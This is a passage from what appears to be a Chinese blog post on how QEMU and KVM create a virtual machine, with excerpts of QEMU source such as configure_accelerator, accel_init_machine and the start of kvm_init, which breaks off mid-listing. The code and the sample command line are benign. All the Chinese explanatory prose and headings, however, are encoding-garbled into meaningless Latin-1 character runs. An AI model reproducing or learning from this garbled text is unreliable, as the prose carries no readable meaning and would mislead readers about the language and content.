åŒºåŸŸæ¥å¼€å¯ã€‚ç„¶è€Œï¼Œåœ¨åˆ›å»ºç¬¬ä¸€ä¸ªè™šæ‹Ÿæœºä¹‹å‰ï¼Œè¿™äº›æ­¥éª¤ä¸ä¼šæ‰§è¡Œã€‚è¿™æ˜¯ä¸€ç§æƒ°æ€§ç­–ç•¥ï¼Œåªæœ‰åœ¨å®é™…éœ€è¦åˆ›å»ºè™šæ‹Ÿæœºæ—¶æ‰ä¼šå¯ç”¨ VMX æ¨¡å¼ï¼Œä»¥é¿å…ä¸å¿…è¦çš„å¼€é”€ã€‚</li></ol><p>ç»¼ä¸Šæ‰€è¿°ï¼ŒKVM æ¨¡å—çš„åˆå§‹åŒ–è¿‡ç¨‹ä¸»è¦åŒ…æ‹¬ç¡¬ä»¶æ£€æŸ¥ã€èµ„æºåˆ†é…ã€è®¾å¤‡èŠ‚ç‚¹åˆ›å»ºã€å…¨å±€å˜é‡è®¾ç½®ã€VMCS é…ç½®ç­‰æ­¥éª¤ã€‚è¯¥è¿‡ç¨‹ç¡®ä¿äº†åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸‹èƒ½å¤Ÿå‡†å¤‡å¥½å¿…è¦çš„æ•°æ®ç»“æ„å’Œé…ç½®ï¼Œä»¥ä¾¿åœ¨åˆ›å»ºå’Œç®¡ç†è™šæ‹Ÿæœºæ—¶è¿›è¡Œæœ‰æ•ˆçš„è™šæ‹ŸåŒ–æ“ä½œã€‚çœŸæ­£çš„ VMX æ¨¡å¼å¼€å¯æ˜¯åœ¨åˆ›å»ºç¬¬ä¸€ä¸ªè™šæ‹Ÿæœºæ—¶æ‰ä¼šæ‰§è¡Œï¼Œä»¥é¿å…ä¸å¿…è¦çš„æ€§èƒ½æŸè€—ã€‚</p><h2 id="4-3-è™šæ‹Ÿæœºçš„åˆ›å»º"><a href="#4-3-è™šæ‹Ÿæœºçš„åˆ›å»º" class="headerlink" title="4.3 è™šæ‹Ÿæœºçš„åˆ›å»º"></a>4.3 è™šæ‹Ÿæœºçš„åˆ›å»º</h2><p>è¦åˆ›å»ºä¸€ä¸ªKVMè™šæ‹Ÿæœºï¼Œéœ€è¦ç”¨æˆ·ä¾§çš„QEMUå‘èµ·è¯·æ±‚ï¼Œä¸‹é¢ä»QEMUå’ŒKVMä¸¤ä¸ªæ–¹é¢æ¥è€ƒå¯ŸKVMè™šæ‹Ÿæœºåˆ›å»ºè¿‡ç¨‹</p><h3 id="4-3-1-QEMUä¾§è™šæ‹Ÿæœºçš„åˆ›å»º"><a href="#4-3-1-QEMUä¾§è™šæ‹Ÿæœºçš„åˆ›å»º" class="headerlink" title="4.3.1 QEMUä¾§è™šæ‹Ÿæœºçš„åˆ›å»º"></a>4.3.1 QEMUä¾§è™šæ‹Ÿæœºçš„åˆ›å»º</h3><p>å½“åœ¨QEMUå‘½ä»¤è¡ŒåŠ å…¥â€“enable-kvmæ—¶ï¼Œè§£æä¼šè¿›å…¥ä¸‹é¢çš„caseåˆ†æ”¯ï¼Œç»™machine optslistè¿™ä¸ªå‚æ•°é¡¹åŠ äº†ä¸€ä¸ªaccel=kvmå‚æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> QEMU_OPTION_enable_kvm:<br>    olist = qemu_find_opts(<span class="hljs-string">&quot;machine&quot;</span>);<br>    qemu_opts_parse_noisily(olist, <span class="hljs-string">&quot;accel=kvm&quot;</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>è¯¥caseå¤„ç†å‘½ä»¤è¡Œé€‰é¡¹<code>QEMU_OPTION_enable_kvm</code>ï¼Œè¿™ä¸ªé€‰é¡¹æ˜¯åœ¨å‘½ä»¤è¡Œä¸­åŠ å…¥äº†<code>--enable-kvm</code>æ—¶è§¦å‘çš„</p><p>åœ¨è¿™ä¸ªåˆ†æ”¯ä¸­ï¼Œé¦–å…ˆå£°æ˜äº†ä¸€ä¸ª<code>olist</code>å˜é‡ï¼Œå®ƒæŒ‡å‘ä¸€ä¸ª<code>QemuOptsList</code>å¯¹è±¡ã€‚è¿™æ˜¯ä¸€ä¸ªç”¨äºå­˜å‚¨QEMUé€‰é¡¹çš„åˆ—è¡¨ï¼Œè¿™é‡Œçš„<code>olist</code>ç”¨äºæŸ¥æ‰¾åä¸º<code>&quot;machine&quot;</code>çš„é€‰é¡¹ã€‚</p><p><strong><code>qemu_find_opts</code>å‡½æ•°ï¼š</strong> è¿™ä¸ªå‡½æ•°ç”¨äºæŸ¥æ‰¾ä¸ç»™å®šé€‰é¡¹ååŒ¹é…çš„<code>QemuOptsList</code>å¯¹è±¡ã€‚åœ¨è¿™é‡Œï¼Œå®ƒç”¨äºæŸ¥æ‰¾åä¸º<code>&quot;machine&quot;</code>çš„é€‰é¡¹å¯¹åº”çš„<code>QemuOptsList</code>å¯¹è±¡ã€‚</p><p><code>qemu_opts_parse_noisily</code>å‡½æ•°ç›®çš„æ˜¯åœ¨ç»™å®šçš„<code>QemuOptsList</code>åˆ—è¡¨ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„<code>QemuOpts</code>å¯¹è±¡ï¼Œå¹¶ä»æä¾›çš„å‚æ•°å­—ç¬¦ä¸²ä¸­è§£æé€‰é¡¹å€¼<br><strong>å‚æ•°è¯´æ˜ï¼š</strong></p><ul><li><code>list</code>ï¼šæŒ‡å‘ä¸€ä¸ª<code>QemuOptsList</code>å¯¹è±¡ï¼Œè¡¨ç¤ºè¦åœ¨å…¶ä¸­åˆ›å»ºæ–°çš„<code>QemuOpts</code>å¯¹è±¡ã€‚</li><li><code>params</code>ï¼šä¸€ä¸ªåŒ…å«å‚æ•°å­—ç¬¦ä¸²çš„Cé£æ ¼å­—ç¬¦æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«è¦è§£æçš„é€‰é¡¹åŠå…¶å€¼ã€‚</li><li><code>permit_abbrev</code>ï¼šä¸€ä¸ªå¸ƒå°”å€¼ï¼Œå¦‚æœä¸º<code>true</code>ï¼Œåˆ™å…è®¸ç¬¬ä¸€ä¸ª<code>key=value</code>åœ¨å‚æ•°å­—ç¬¦ä¸²ä¸­çœç•¥<code>key=</code>ï¼Œå¹¶ä¸”ä¼šè¢«è§†ä¸º<code>list-&gt;implied_opt_name</code>çš„é”®å€¼å¯¹ã€‚</li></ul><p>ä¸€ä¸ªQEMUå‘½ä»¤è¡Œå®ä¾‹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qemu</span>-system-x<span class="hljs-number">86</span>_<span class="hljs-number">64</span> --enable-kvm -machine accel=kvm -m <span class="hljs-number">2</span>G -cpu host -hda ubuntu.img<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨äº†<code>--enable-kvm</code>å‚æ•°æ¥å¯ç”¨KVMè™šæ‹ŸåŒ–åŠ é€Ÿ</li><li>ä½¿ç”¨äº†<code>-machine accel=kvm</code>é€‰é¡¹æ¥æŒ‡å®šè™šæ‹Ÿæœºçš„åŠ é€Ÿæ–¹å¼ä¸ºKVM</li><li><code>-m 2G</code>ç”¨äºåˆ†é…2GBå†…å­˜ç»™è™šæ‹Ÿæœº</li><li><code>-cpu host</code>ç”¨äºä½¿ç”¨å®¿ä¸»æœºçš„CPUç‰¹æ€§</li><li><code>-hda ubuntu.img</code>æŒ‡å®šè™šæ‹Ÿæœºçš„ç¡¬ç›˜é•œåƒ</li></ul><p>ä¹‹åmainå‡½æ•°ä¼šåœ¨4360è¡Œè°ƒç”¨<code>configure_accelerator(current_machine)</code>ï¼Œè¯¥å‡½æ•°ä¼šä»machineçš„å‚æ•°åˆ—è¡¨ä¸­å–å‡ºaccelçš„å€¼ï¼Œæ‰¾å‡ºæ‰€å±çš„ç±»å‹ï¼Œ<strong>ç„¶åè°ƒç”¨accel_init_machine</strong>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">configure_accelerator</span><span class="hljs-params">(MachineState *ms)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *p;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">10</span>];<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-keyword">bool</span> accel_initialised = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">bool</span> init_failed = <span class="hljs-literal">false</span>;<br>    AccelClass *acc = <span class="hljs-literal">NULL</span>;<br><br>    p = qemu_opt_get(qemu_get_machine_opts(), <span class="hljs-string">&quot;accel&quot;</span>);<br>    <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">/* Use the default &quot;accelerator&quot;, tcg */</span><br>        p = <span class="hljs-string">&quot;tcg&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (!accel_initialised &amp;&amp; *p != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;:&#x27;</span>) &#123;<br>            p++;<br>        &#125;<br>        p = get_opt_name(buf, <span class="hljs-keyword">sizeof</span>(buf), p, <span class="hljs-string">&#x27;:&#x27;</span>);<br>        acc = accel_find(buf);<br>        <span class="hljs-keyword">if</span> (!acc) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\&quot;%s\&quot; accelerator not found.\n&quot;</span>, buf);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (acc-&gt;available &amp;&amp; !acc-&gt;available()) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s not supported for this target\n&quot;</span>,<br>                   acc-&gt;name);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        ret = accel_init_machine(acc, ms);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            init_failed = <span class="hljs-literal">true</span>;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to initialize %s: %s\n&quot;</span>,<br>                    acc-&gt;name,<br>                    strerror(-ret));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            accel_initialised = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!accel_initialised) &#123;<br>        <span class="hljs-keyword">if</span> (!init_failed) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;No accelerator found!\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (init_failed) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Back to %s accelerator.\n&quot;</span>, acc-&gt;name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>accel_init_machineè¿™æ®µä»£ç å®ç°äº†åŠ é€Ÿå™¨çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹ KVM åŠ é€Ÿå™¨ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ <code>KVMState</code> å¯¹è±¡ï¼Œå°†å…¶èµ‹å€¼ç»™è™šæ‹Ÿæœºçš„ <code>accelerator</code> æˆå‘˜ï¼Œå¹¶è°ƒç”¨åŠ é€Ÿå™¨çš„åˆå§‹åŒ–å›è°ƒå‡½æ•°ã€‚å¦‚æœåˆå§‹åŒ–å¤±è´¥ï¼Œåˆ™ä¼šæ¸…é™¤ç›¸åº”çš„çŠ¶æ€ã€‚è¿™æ ·ï¼Œåœ¨è™šæ‹Ÿæœºè¿è¡Œæ—¶ï¼ŒKVM åŠ é€Ÿå™¨å°†èƒ½å¤Ÿæ ¹æ®åŠ é€Ÿå™¨çŠ¶æ€è¿›è¡ŒåŠ é€Ÿæ“ä½œ</p><ol><li>é¦–å…ˆï¼Œ<code>accel_init_machine</code> å‡½æ•°è¢«è°ƒç”¨ï¼Œç”¨äºåˆå§‹åŒ–ç‰¹å®šçš„åŠ é€Ÿå™¨ï¼ˆAccelClassï¼‰ã€‚</li><li>åœ¨æ­¤å‡½æ•°ä¸­ï¼Œé¦–å…ˆè·å–äº†åŠ é€Ÿå™¨çš„ç±»å¯¹è±¡ï¼ˆ<code>ObjectClass</code>ï¼‰å’Œç±»åï¼ˆ<code>cname</code>ï¼‰ã€‚</li><li>æ¥ä¸‹æ¥ï¼Œé€šè¿‡è°ƒç”¨ <code>object_new(cname)</code> åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ <code>AccelState</code> å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ˜¯ç‰¹å®šåŠ é€Ÿå™¨çš„çŠ¶æ€æ•°æ®ç»“æ„ï¼Œå¯¹äº KVM åŠ é€Ÿå™¨æ¥è¯´ï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ª <code>KVMState</code> å¯¹è±¡ã€‚</li><li>ç„¶åï¼Œå°†æ–°åˆ›å»ºçš„ <code>AccelState</code>ï¼ˆå³ <code>KVMState</code>ï¼‰å¯¹è±¡èµ‹å€¼ç»™è™šæ‹Ÿæœºçš„ <code>accelerator</code> æˆå‘˜ï¼Œå³ <code>ms-&gt;accelerator = accel;</code>ã€‚</li><li>è®¾ç½® <code>acc-&gt;allowed</code> ä¸º <code>true</code>ï¼Œè¡¨ç¤ºå…è®¸ä½¿ç”¨æ­¤åŠ é€Ÿå™¨ã€‚</li><li>è°ƒç”¨åŠ é€Ÿå™¨çš„ <code>init_machine</code> å›è°ƒå‡½æ•°ï¼Œå¯¹äº KVM åŠ é€Ÿå™¨æ¥è¯´ï¼Œè¿™æ˜¯ <code>kvm_init</code> å‡½æ•°ã€‚<ol><li>å¦‚æœ <code>init_machine</code> å‡½æ•°è¿”å›å€¼å°äº 0ï¼Œè¡¨ç¤ºåˆå§‹åŒ–å¤±è´¥ï¼Œäºæ˜¯æ¸…ç©ºè™šæ‹Ÿæœºçš„ <code>accelerator</code> æˆå‘˜ï¼Œå¹¶å°† <code>acc-&gt;allowed</code> è®¾ç½®ä¸º <code>false</code>ï¼ŒåŒæ—¶é‡Šæ”¾ä¹‹å‰åˆ›å»ºçš„ <code>AccelState</code> å¯¹è±¡ï¼ˆ<code>object_unref(OBJECT(accel));</code>ï¼‰ã€‚</li></ol></li><li>æœ€åï¼Œè¿”å› <code>init_machine</code> çš„è¿”å›å€¼ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">accel_init_machine</span><span class="hljs-params">(AccelClass *acc, MachineState *ms)</span></span><br><span class="hljs-function"></span>&#123;<br>    ObjectClass *oc = OBJECT_CLASS(acc);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cname = object_class_get_name(oc);<br>    AccelState *accel = ACCEL(object_new(cname));  <span class="hljs-comment">// KVMState</span><br>    <span class="hljs-keyword">int</span> ret;<br>    ms-&gt;accelerator = accel;<br>    *(acc-&gt;allowed) = <span class="hljs-literal">true</span>;<br>    ret = acc-&gt;init_machine(ms); <span class="hljs-comment">//å¯¹äº KVM åŠ é€Ÿå™¨æ¥è¯´ï¼Œè¿™æ˜¯ `kvm_init` å‡½æ•°</span><br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        ms-&gt;accelerator = <span class="hljs-literal">NULL</span>;<br>        *(acc-&gt;allowed) = <span class="hljs-literal">false</span>;<br>        object_unref(OBJECT(accel));<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>åœ¨ QEMU ä¸­ï¼Œä½¿ç”¨ <code>KVMState</code> ç»“æ„ä½“æ¥è¡¨ç¤ºä¸ KVM ç›¸å…³çš„æ•°æ®ç»“æ„</p></blockquote><p>kvm_initå‡½æ•°é€šè¿‡ KVM åœ¨ç¡¬ä»¶å±‚é¢æä¾›åŠ é€ŸåŠŸèƒ½ï¼Œä»¥æé«˜è™šæ‹Ÿæœºçš„æ€§èƒ½å’Œæ•ˆç‡ã€‚å®ƒä¼šæ£€æŸ¥ KVM æ˜¯å¦æ”¯æŒæ‰€éœ€çš„åŠŸèƒ½ï¼Œç„¶ååˆ›å»ºè™šæ‹Ÿæœºå¹¶è¿›è¡Œä¸€äº›åˆå§‹åŒ–å·¥ä½œï¼Œç¡®ä¿è™šæ‹Ÿæœºèƒ½å¤Ÿæ­£ç¡®è¿è¡Œåœ¨ KVM åŠ é€Ÿå™¨ä¸Š</p><ol><li><strong>æ‰“å¼€ KVM è®¾å¤‡</strong>ï¼šé¦–å…ˆï¼Œå‡½æ•°å°è¯•æ‰“å¼€ â€œ/dev/kvmâ€ è®¾å¤‡ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨ <code>qemu_open</code>ã€‚å¦‚æœæ‰“å¼€å¤±è´¥ï¼Œä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶è¿”å›é”™è¯¯ç ã€‚</li><li><strong>æ£€æŸ¥ KVM ç‰ˆæœ¬</strong>ï¼šä½¿ç”¨ <code>KVM_GET_API_VERSION</code> ioctl æŸ¥è¯¢ KVM API ç‰ˆæœ¬ï¼Œå¹¶ä¸ä»£ç ä¸­å®šä¹‰çš„ <code>KVM_API_VERSION</code> è¿›è¡Œæ¯”è¾ƒï¼Œä»¥ç¡®ä¿ KVM ç‰ˆæœ¬æ”¯æŒã€‚å¦‚æœç‰ˆæœ¬æ£€æŸ¥å¤±è´¥ï¼Œä¼šè¾“å‡ºç›¸åº”çš„é”™è¯¯ä¿¡æ¯ã€‚</li><li><strong>åˆ›å»ºè™šæ‹Ÿæœºï¼ˆVMï¼‰</strong>ï¼šé€šè¿‡ <code>KVM_CREATE_VM</code> ioctl åœ¨ KVM å±‚é¢åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœºï¼Œå¹¶å°†æ–‡ä»¶æè¿°ç¬¦ä¿å­˜åˆ° <code>KVMState</code> ç»“æ„ä½“çš„æˆå‘˜å˜é‡ä¸­ã€‚è¿™ä¸ªè™šæ‹Ÿæœºå°†ç”¨äºæ‰¿è½½å®¢æˆ·æœºçš„è¿è¡Œã€‚</li><li><strong>æ£€æŸ¥æ‰©å±•æ”¯æŒ</strong>ï¼šä½¿ç”¨ä¸åŒçš„ <code>kvm_check_extension</code> å‡½æ•°æ£€æŸ¥ KVM æ˜¯å¦æ”¯æŒå„ç§ç‰¹æ€§å’Œæ‰©å±•ï¼Œå¦‚å†…å­˜æ’æ§½æ•°é‡ã€è™šæ‹Ÿ CPU äº‹ä»¶ã€ååŒ MMIOã€IRQ è·¯ç”±ç­‰ã€‚å¦‚æœä¸æ”¯æŒæŸäº›æ‰©å±•ï¼Œä¼šè¾“å‡ºç›¸åº”çš„é”™è¯¯ä¿¡æ¯ã€‚</li><li><strong>åˆå§‹åŒ–æ¶æ„ç›¸å…³å†…å®¹</strong>ï¼šè°ƒç”¨ <code>kvm_arch_init</code> å‡½æ•°ï¼Œå®Œæˆä¸€äº›ä¸ç‰¹å®šæ¶æ„ç›¸å…³çš„åˆå§‹åŒ–å·¥ä½œï¼Œå¦‚å¯¹äº x86 æ¶æ„ï¼Œéœ€è¦è®¾ç½®æ”¯æŒ vm86 æ¨¡å¼çš„ä¸€äº› IOCTLã€‚</li><li><strong>åˆ›å»º IRQCHIP</strong>ï¼šå¦‚æœå…è®¸ä½¿ç”¨ IRQCHIPï¼Œè°ƒç”¨ <code>kvm_irqchip_create</code> å‡½æ•°åˆ›å»º IRQ æ§åˆ¶å™¨ã€‚</li><li><strong>æ³¨å†Œç›‘å¬å™¨</strong>ï¼šæ³¨å†Œ MEMORY å’Œ IO ç›‘å¬å™¨ï¼Œç”¨äºå¤„ç†å†…å­˜å’Œ I/O çš„äº‹ä»¶ï¼Œä¾‹å¦‚å†…å­˜åŒºåŸŸçš„è¯»å†™ã€‚</li><li><strong>è®¾ç½®ä¸­æ–­å¤„ç†å‡½æ•°</strong>ï¼šå°†ä¸­æ–­å¤„ç†å‡½æ•°æŒ‡å‘ <code>kvm_handle_interrupt</code>ï¼Œè¯¥å‡½æ•°ç”¨äºå¤„ç†ä¸­æ–­äº‹ä»¶ã€‚</li><li><strong>å…¶ä»–åŠŸèƒ½è®¾ç½®</strong>ï¼šè®¾ç½®ä¸€äº›å…¶ä»–çš„å‚æ•°å’ŒåŠŸèƒ½ï¼Œå¦‚å¤šä¸ª IOEVENTFD æ”¯æŒç­‰ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">kvm_init</span><span class="hljs-params">(MachineState *ms)</span></span><br><span class="hljs-function"></span>&#123;<br>    MachineClass *mc = MACHINE_GET_CLASS(ms);<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> upgrade_note[] =<br>        <span class="hljs-string">&quot;Please upgrade to at least kernel 2.6.29 or recent kvm-kmod\n&quot;</span><br>        <span class="hljs-string">&quot;(see http://sourceforge.net/projects/kvm).\n&quot;</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>        <span class="hljs-keyword">int</span> num;<br>    &#125; num_cpus[] = &#123;<br>        &#123; <span class="hljs-string">&quot;SMP&quot;</span>,          smp_cpus &#125;,        <span class="hljs-comment">// æ•°é‡</span><br>        &#123; <span class="hljs-string">&quot;hotpluggable&quot;</span>, max_cpus &#125;,        <span class="hljs-comment">// å¯çƒ­æ’æ‹”</span><br>        &#123; <span class="hljs-literal">NULL</span>, &#125;<br>    &#125;, *nc = num_cpus;<br>    <span class="hljs-keyword">int</span> soft_vcpus_limit, hard_vcpus_limit;<br>    KVMState *s;<br>    <span class="hljs-keyword">const</span> KVMCapabilityInfo *missing_cap;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-keyword">int</span> type = <span 